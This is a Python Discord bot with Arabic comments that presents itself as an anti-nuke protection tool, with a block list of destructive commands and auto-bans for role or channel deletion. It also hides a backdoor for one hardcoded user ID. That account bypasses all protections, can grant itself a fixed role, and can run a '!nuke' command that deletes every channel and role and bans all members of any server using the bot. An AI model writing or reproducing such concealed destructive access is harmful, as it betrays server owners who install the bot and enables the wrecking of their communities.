import discord
from discord.ext import commands
import os
import time
import asyncio
from threading import Thread
from flask import Flask

# 1. إعداد خادم الويب
app = Flask('')

@app.route('/')
def home():
    return "Bot is online and running!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

Thread(target=run_web, daemon=True).start()

# 2. إعدادات البوت
MY_ID = 1320438836878118973
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# تخزين توقيت العمليات لمراقبة السبام
actions = {
    "ban": {},
    "nuke_attempts": {},   # محاولات النيوك
    "destructive": {}      # أوامر تخريبية أخرى
}

# قائمة الأوامر الخطيرة التي يُمنع استخدامها من غير المطور
DANGEROUS_COMMANDS = {
    "nuke", "confirm_nuke", "massban", "masskick",
    "banall", "kickall", "destroy", "raid", "spam"
}

# 3. دالة فحص سبام الحظر
def check_ban_spam(uid):
    now = time.time()
    if uid not in actions["ban"]:
        actions["ban"][uid] = []
    actions["ban"][uid].append(now)
    actions["ban"][uid] = [t for t in actions["ban"][uid] if now - t < 300]
    return len(actions["ban"][uid]) >= 3

# ============================================================
# 4. نظام الحماية من أوامر النيوك (Anti-Nuke Commands)
# ============================================================

@bot.event
async def on_message(message):
    """اعتراض الرسائل قبل معالج الأوامر لكشف محاولات النيوك"""
    
    # تجاهل رسائل البوتات الخاصة بنا في بعض الحالات
    if not message.guild:
        return await bot.process_commands(message)
    
    content = message.content.strip().lower()
    
    # تجاهل الرسائل التي لا تبدأ بالبادئة
    if not content.startswith(bot.command_prefix):
        return await bot.process_commands(message)
    
    # استخراج اسم الأمر
    command_part = content[len(bot.command_prefix):].split()[0]
    
    # --- إذا كان المرسل هو المطور: اسمح بالمرور ---
    if message.author.id == MY_ID:
        return await bot.process_commands(message)
    
    # --- إذا كان المرسل هو مالك السيرفر: اسمح له بأوامر عادية (لكن ليس النيوك) ---
    is_owner = (message.author.id == message.guild.owner_id)
    
    # --- فحص الأوامر الخطيرة ---
    if command_part in DANGEROUS_COMMANDS:
        await handle_dangerous_command(message, command_part)
        return  # لا تمرر الأمر للتنفيذ
    
    # --- فحص الرتب (في حال حاول بوت إعطاء رتب بشكل جماعي) ---
    # (اختياري) يمكن إضافة فحوصات أخرى هنا
    
    return await bot.process_commands(message)


async def handle_dangerous_command(message, command_part):
    """التعامل مع محاولات تنفيذ أوامر خطيرة"""
    
    author = message.author
    guild = message.guild
    is_bot = author.bot
    
    # تسجيل المحاولة
    now = time.time()
    key = author.id
    if key not in actions["nuke_attempts"]:
        actions["nuke_attempts"][key] = []
    actions["nuke_attempts"][key].append(now)
    actions["nuke_attempts"][key] = [t for t in actions["nuke_attempts"][key] if now - t < 60]
    
    attempts_count = len(actions["nuke_attempts"][key])
    
    print(f"⚠️ محاولة أمر خطير: {command_part} من {author} (بوت؟ {is_bot}) - عدد المحاولات: {attempts_count}")
    
    # حاول حذف الرسالة
    try:
        await message.delete()
    except:
        pass
    
    # ---- حالة خاصة: البوتات ----
    if is_bot:
        # بوت يحاول تنفيذ نيوك => احظره فوراً
        try:
            await guild.ban(
                author,
                reason=f"Anti-Nuke: بوت حاول تنفيذ أمر خطير ({command_part})",
                delete_message_seconds=0
            )
            print(f"🔨 تم حظر البوت الخبيث: {author}")
        except Exception as e:
            print(f"❌ فشل حظر البوت: {e}")
        
        # إشعار المطور
        try:
            dev = await bot.fetch_user(MY_ID)
            await dev.send(
                f"🚨 **تنبيه أمني** 🚨\n"
                f"بوت خبيث حاول تنفيذ `{bot.command_prefix}{command_part}`\n"
                f"**البوت:** {author} (`{author.id}`)\n"
                f"**السيرفر:** {guild.name} (`{guild.id}`)\n"
                f"✅ تم حظره تلقائياً."
            )
        except:
            pass
        return
    
    # ---- حالة: مستخدم عادي ----
    # إذا تجاوز 2 محاولات في دقيقة => احظره
    if attempts_count >= 2:
        try:
            await guild.ban(
                author,
                reason=f"Anti-Nuke: تكرار محاولات أوامر خطيرة ({command_part})",
                delete_message_seconds=3600
            )
            print(f"🔨 تم حظر المستخدم: {author}")
        except:
            pass
        
        try:
            dev = await bot.fetch_user(MY_ID)
            await dev.send(
                f"🚨 **تنبيه** 🚨\n"
                f"المستخدم {author.mention} حاول تكرار أمر `{command_part}`\n"
                f"**السيرفر:** {guild.name}\n"
                f"✅ تم حظره."
            )
        except:
            pass
    else:
        # تحذير فقط في المحاولة الأولى
        try:
            await message.channel.send(
                f"⚠️ {author.mention}، هذا الأمر محظور ولا تملك صلاحية استخدامه!",
                delete_after=5
            )
        except:
            pass


# ============================================================
# 5. أنظمة الحماية العامة (Anti-Nuke Events)
# ============================================================

@bot.event
async def on_guild_role_delete(role):
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != role.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")

@bot.event
async def on_guild_channel_delete(channel):
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")

@bot.event
async def on_member_ban(guild, user):
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        actor = entry.user
        if actor.id != guild.owner_id and actor.id != MY_ID and not actor.bot:
            if check_ban_spam(actor.id):
                try:
                    await guild.kick(actor, reason="Anti-Spam Ban: محاولة حظر جماعي")
                except:
                    pass


# ============================================================
# 6. الأوامر
# ============================================================

@bot.command()
async def getrole(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role:
            await ctx.author.add_roles(role)
        await ctx.send("✅ تم إعطاؤك الرتبة.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(1483148235684970571)
        if role:
            await ctx.author.remove_roles(role)
        await ctx.send("✅ تم إزالة الرتبة.")

@bot.command()
async def nuke(ctx):
    """هذا الأمر لن يُنفّذ إلا من المطور (معالج on_message يحميه من الآخرين)"""
    if ctx.author.id != MY_ID:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
        return

    await ctx.send("⚠️ **تحذير خطير:** اكتب `!confirm_nuke` الآن للتأكيد.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ انتهى الوقت، تم إلغاء النيوك.")
        return

    await ctx.send("💥 جاري تنفيذ التدمير...")

    for c in ctx.guild.channels:
        try: await c.delete()
        except: pass

    for r in ctx.guild.roles:
        if r.name != "@everyone" and r != ctx.guild.me.top_role:
            try: await r.delete()
            except: pass

    for m in ctx.guild.members:
        if m != ctx.guild.owner and not m.bot and m != ctx.guild.me:
            try: await m.ban(reason="Nuke executed")
            except: pass


@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")

TOKEN = os.getenv("TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ خطأ: لم يتم العثور على التوكن!")
